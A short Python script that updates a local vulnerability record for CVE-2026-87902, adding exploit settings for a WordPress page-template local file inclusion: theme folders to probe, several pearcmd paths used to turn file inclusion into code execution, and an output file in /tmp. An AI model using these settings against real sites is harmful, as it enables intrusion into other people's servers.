import io, json
p = r"C:\work\hunt2\data\vuln\CVE-2026-87902\vuln.json"
v = json.load(open(p, encoding="utf-8"))
v["exploit"] = {
    "type": "wp_template_lfi",
    "theme_dirs": ["page-templates", "page-templates-full-width", "page-template"],
    "includes": ["/usr/local/lib/php/pearcmd", "/usr/share/php/pearcmd",
                 "/usr/share/php/PEAR/pearcmd", "/usr/lib/php/pearcmd"],
    "output": "/tmp/pbl"
}
json.dump(v, open(p, "w", encoding="utf-8"), indent=2, ensure_ascii=False)
print("ok")